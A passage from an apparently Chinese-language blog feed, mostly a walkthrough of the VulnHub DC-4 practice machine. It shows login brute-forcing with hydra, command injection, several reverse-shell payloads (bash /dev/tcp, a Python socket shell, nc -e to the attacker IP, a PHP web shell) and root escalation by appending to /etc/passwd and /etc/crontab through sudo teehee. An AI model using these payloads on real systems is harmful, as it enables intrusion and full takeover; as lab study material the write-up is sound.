(D:\Blog\blog\node_modules\bluebird\js\release\promise.js:729:18)<br>      at _drainQueueStep (D:\Blog\blog\node_modules\bluebird\js\release\async.js:93:12)<br>      at _drainQueue (D:\Blog\blog\node_modules\bluebird\js\release\async.js:86:9)<br>      at Async._drainQueues (D:\Blog\blog\node_modules\bluebird\js\release\async.js:102:5)<br>      at Immediate.Async.drainQueues [as _onImmediate] (D:\Blog\blog\node_modules\bluebird\js\release\async.js:15:14)<br>      at processImmediate (internal/timers.js:464:21) &#123;<br>    generatedMessage: <span class="hljs-literal">true</span>,<br>    code: <span class="hljs-string">&#x27;ERR_ASSERTION&#x27;</span>,<br>    actual: null,<br>    expected: <span class="hljs-literal">true</span>,<br>    operator: <span class="hljs-string">&#x27;==&#x27;</span><br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><strong>原因：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">标题中使用 <span class="hljs-code">`&#123;&#123; &#125;&#125;`</span> 导致错误<br></code></pre></td></tr></table></figure><p><strong>解决方法：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">改为使用 &#123;% raw %&#125;&#123;&#123;  &#125;&#125;&#123;% endraw %&#125; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC：4</title>
    <link href="/2022/07/11/Penetration/Vulnhub/Part-1/0x07%20DC-4/"/>
    <url>/2022/07/11/Penetration/Vulnhub/Part-1/0x07%20DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="0x07-DC-4-vulnhub"><a href="#0x07-DC-4-vulnhub" class="headerlink" title="0x07 DC: 4~vulnhub"></a>0x07 DC: 4~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">DC: 4 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.159</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.159</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.159</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-10 20:03 EDT<br>Nmap scan report for 192.168.135.159<br>Host is up (0.0016s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)<br>|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)<br>|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)<br>80/tcp open  http    nginx 1.15.10<br>|_http-server-header: nginx/1.15.10<br>|_http-title: System Tools<br>MAC Address: 00:0C:29:A2:63:02 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>nginx 1.15.10</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>80端口</strong></p><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.159</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.159  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.159</span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.159</span>                                                              <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.159/_22-07-10_20-11-36.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-10_20-11-36.log<br>Target: http://192.168.135.159/<br><br>[20:11:36] Starting: <br>[20:12:49] 302 -  704B  - /command.php  -&gt;  index.php                       <br>[20:12:56] 301 -  170B  - /css  -&gt;  http://192.168.135.159/css/             <br>[20:13:20] 301 -  170B  - /images  -&gt;  http://192.168.135.159/images/       <br>[20:13:20] 403 -  556B  - /images/                                          <br>[20:13:21] 200 -  506B  - /index.php                                        <br>[20:13:22] 403 -   15B  - /index.pHp                                        <br>[20:13:32] 302 -  206B  - /login.php  -&gt;  index.php                         <br>[20:13:33] 302 -  163B  - /logout.php  -&gt;  index.php                        <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>查看，发现是个登录页，尝试爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.135.159 http-form-post <span class="hljs-string">&#x27;/login.php:username=^USER^&amp;password=^PASS^:S=logout&#x27;</span></span><br>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 20:37:28<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://192.168.135.159:80/login.php:username=^USER^&amp;password=^PASS^:S=logout<br>[80][http-post-form] host: 192.168.135.159   login: admin   password: happy<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 20:37:53<br></code></pre></td></tr></table></figure><p>得到：<code>login: admin   password: happy</code> ，登陆，看到有个 <code>Command</code> ，进去后发现可以执行命令，不过只能执行特定的命令。</p><blockquote><p>可能需要登录两次，不知为何第一次登陆后只是刷新了页面</p></blockquote><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>使用 burp 抓包，Send to Repeater：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /command.php HTTP/1.1<br>Host: 192.168.135.159<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 22<br>Origin: http://192.168.135.159<br>Connection: close<br>Referer: http://192.168.135.159/command.php<br>Cookie: PHPSESSID=cetjo47ie8r15re8h7qr32la17<br>Upgrade-Insecure-Requests: 1<br><br>radio=ls+-l&amp;submit=Run<br></code></pre></td></tr></table></figure><p>修改 POST 数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=whoami&amp;submit=Run<br></code></pre></td></tr></table></figure><p>send，成功执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">You have selected: whoami&lt;br /&gt;<br>&lt;pre&gt;<br>www-data<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>再次修改，反弹 shell，经过测试，bash、python 反弹都未成功，写一句话木马也没成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1&amp;submit=Run<br>radio=import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&amp;submit=Run<br>radio=echo &quot;&lt;?php $wzz=$_GET[&#x27;wzz&#x27;]; echo `$wzz`; ?&gt;&quot; &gt; shell.php&amp;submit=Run<br></code></pre></td></tr></table></figure><p>nc 成功反弹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=nc -e /bin/sh 192.168.135.141 4444&amp;submit=Run<br></code></pre></td></tr></table></figure><p>kali 监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                                    <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.159] 59456<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-4:/usr/share/nginx/html$ <br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>在 jim 用户目录下发现一些旧密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-4:/usr/share/nginx/html$ ls /home<br>ls /home<br>charles  jim  sam<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/charles<br>ls -l /home/charles<br>total 0<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/sam<br>ls -l /home/sam<br>total 0<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/jim    <br>ls -l /home/jim<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/jim/backups<br>ls -l /home/jim/backups<br>total 4<br>-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak<br>www-data@dc-4:/usr/share/nginx/html$ cat /home/jim/backups/old-passwords.bak<br>cat /home/jim/backups/old-passwords.bak<br>000000<br>12345<br>iloveyou<br>[......]<br></code></pre></td></tr></table></figure><p>hydra 爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l jim -P passwd.txt 192.168.135.159 ssh</span><br>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 23:29:09<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task<br>[DATA] attacking ssh://192.168.135.159:22/<br>[STATUS] 179.00 tries/min, 179 tries in 00:01h, 76 to do in 00:01h, 16 active<br>[22][ssh] host: 192.168.135.159   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 23:30:43<br></code></pre></td></tr></table></figure><p>得到 <code>login: jim   password: jibril04</code> ，登录 SSH：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh jim@192.168.135.159</span><br>jim@192.168.135.159&#x27;s password: <br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100<br>jim@dc-4:/$<br></code></pre></td></tr></table></figure><p>看到有个邮件，查找邮件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">jim@dc-4:/$ find / -name mail 2&gt;/dev/null<br>/usr/bin/mail<br>/etc/alternatives/mail<br>/var/mail<br>/var/spool/mail<br>jim@dc-4:/$ ls -l /var/mail<br>total 8<br>-rw-rw---- 1 jim      mail  715 Apr  6  2019 jim<br>-rw-rw---- 1 www-data mail 1776 Jul 11 11:56 www-data<br>jim@dc-4:/$ cat /var/mail/jim<br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=&quot;UTF-8&quot;<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O<br>Hi Jim,<br>I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.<br>Password is:  ^xHhA&amp;hvim0y<br>See ya,<br>Charles<br></code></pre></td></tr></table></figure><p> 得到 <code>Charles</code> 用户密码：<code>^xHhA&amp;hvim0y</code> ，切换到 <code>Charles</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">jim@dc-4:~$ su charles<br>Password: <br>charles@dc-4:/home/jim$ <br></code></pre></td></tr></table></figure><p>查看 sudo：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ sudo -l<br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br></code></pre></td></tr></table></figure><p>发现可以无密码运行 teehee</p><p><strong>方法一：创建一个 root 权限用户，用 teehee 往 /etc/passwd 里添加一个 root 权限用户</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ echo &quot;test::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd<br>test::0:0:::/bin/bash<br>charles@dc-4:/home/jim$ su test<br>root@dc-4:/home/jim# whoami<br>root<br>root@dc-4:/home/jim# ls /root<br>flag.txt<br>root@dc-4:/home/jim# cat /root/flag.txt<br><br><br><br>888       888          888 888      8888888b.                             888 888 888 888 <br>888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 <br>888  d8b  888          888 888      888    888                            888 888 888 888 <br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 <br>888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 <br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  <br>888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 <br><br><br>Congratulations!!!<br><br>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure><p><strong>方法二：创建一个定时任务，给 /bin/sh 赋予 SUID 权限，用 teehee 把定时任务写到定时任务文件 /etc/crontab</strong></p><blockquote><p>bash 不可以，sh 可以</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ echo &quot;* * * * * root chmod u+s /bin/bash&quot; | sudo teehee -a /etc/crontab<br>* * * * * root chmod 4777 /bin/bash<br>charles@dc-4:/home/jim$ cat /etc/crontab<br><span class="hljs-meta">#</span><span class="bash"> /etc/crontab: system-wide crontab</span><br><span class="hljs-meta">#</span><span class="bash"> Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta">#</span><span class="bash"> and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta">#</span><span class="bash"> that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">* * * * * root chmod u+s /bin/bash</span><br>charles@dc-4:/home/jim$ ls -l /bin/bash<br>-rwsrwxrwx 1 root root 1265272 May 16  2017 /bin/bash<br>charles@dc-4:/home/jim$ /bin/bash<br>bash-4.4$ whoami<br>charles<br>bash-4.4$ exit<br><br>charles@dc-4:/home/jim$ echo &quot;* * * * * root chmod u+s /bin/sh&quot; | sudo teehee -a /etc/crontab<br>* * * * * root chmod u+s /bin/sh<br>charles@dc-4:/home/jim$ cat /etc/crontab<br><span class="hljs-meta">#</span><span class="bash"> /etc/crontab: system-wide crontab</span><br><span class="hljs-meta">#</span><span class="bash"> Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta">#</span><span class="bash"> and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta">#</span><span class="bash"> that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">* * * * * root chmod u+s /bin/bash</span><br>* * * * * root chmod u+s /bin/sh<br>charles@dc-4:/home/jim$ ls -l /bin/sh<br>lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash<br>charles@dc-4:/home/jim$ ls -l /bin/dash<br>-rwsr-xr-x 1 root root 124492 Jan 24  2017 /bin/dash<br>charles@dc-4:/home/jim$ /bin/sh<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$0</span></span><br>/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol><li>web 登录页爆破：用户名 admin</li><li>远程命令执行：bash、python 反弹失败，一句话木马写入失败，nc 反弹成功</li><li>旧密码泄露，hydra 爆破 SSH</li><li>邮件泄露用户密码</li><li>teehee 提权（sudo 提权）：创建 root 权限用户（su 提权）、创建计划任务（SUID 提权）</li></ol><h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><p>具有 s 权限的 .sh 文件，写入二进制文件数据后 s 权限没有了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 